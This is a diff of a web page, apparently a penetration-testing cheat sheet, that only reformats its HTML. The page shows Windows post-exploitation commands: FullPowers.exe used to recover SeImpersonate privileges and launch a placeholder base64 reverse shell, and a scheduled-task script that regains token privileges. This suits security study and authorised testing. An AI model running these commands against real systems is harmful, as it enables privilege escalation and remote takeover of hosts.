@@ -198,11 +198,14 @@
 
 <div class="content"><hr>
 <h3 id="abuse-1-recover-seimpresonate">Abuse #1: Recover SeImpresonate</h3>
-<p><a href="https://github.com/itm4n/FullPowers/releases/tag/v0.1">FullPower</a></p>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">FullPowers</span><span class="p">.</span><span class="py">exe</span> <span class="n">-c</span> <span class="s2">&#34;whoami /priv&#34;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Revshell</span>
 </span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">FullPowers</span><span class="p">.</span><span class="py">exe</span> <span class="n">-c</span> <span class="s2">&#34;&lt;powershell #3 Base64&gt;&#34;</span>
-</span></span></code></pre></div><h3 id="abuse-2-recover-tokens-via-schedule-task">Abuse #2: Recover tokens via schedule task</h3>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/itm4n/FullPowers/releases/tag/v0.1">FullPower</a></em></small></p>
+<h3 id="abuse-2-recover-tokens-via-schedule-task">Abuse #2: Recover tokens via schedule task</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Create a list of privileges </span>
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">System.String[]</span><span class="p">]</span><span class="nv">$Privs</span> <span class="p">=</span> <span class="s2">&#34;SeAssignPrimaryTokenPrivilege&#34;</span><span class="p">,</span> <span class="s2">&#34;SeAuditPrivilege&#34;</span><span class="p">,</span> <span class="s2">&#34;SeChangeNotifyPrivilege&#34;</span><span class="p">,</span> <span class="s2">&#34;SeCreateGlobalPrivilege&#34;</span><span class="p">,</span> <span class="s2">&#34;SeImpersonatePrivilege&#34;</span><span class="p">,</span> <span class="s2">&#34;SeIncreaseQuotaPrivilege&#34;</span><span class="p">,</span> <span class="s2">&#34;SeIncreaseWorkingSetPrivilege&#34;</span><span class="p">,</span> <span class="s2">&#34;SeTimeZonePrivilege&#34;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Create a Principal for the task </span>
@@ -213,7 +216,8 @@
 </span></span><span class="line"><span class="cl"><span class="nb">Register-ScheduledTask</span> <span class="n">-Action</span> <span class="nv">$TaskAction</span> <span class="n">-TaskName</span> <span class="s2">&#34;SomeTask&#34;</span> <span class="n">-Principal</span> <span class="nv">$TaskPrincipal</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Start the task</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Start-ScheduledTask</span> <span class="n">-TaskName</span> <span class="s2">&#34;SomeTask&#34;</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
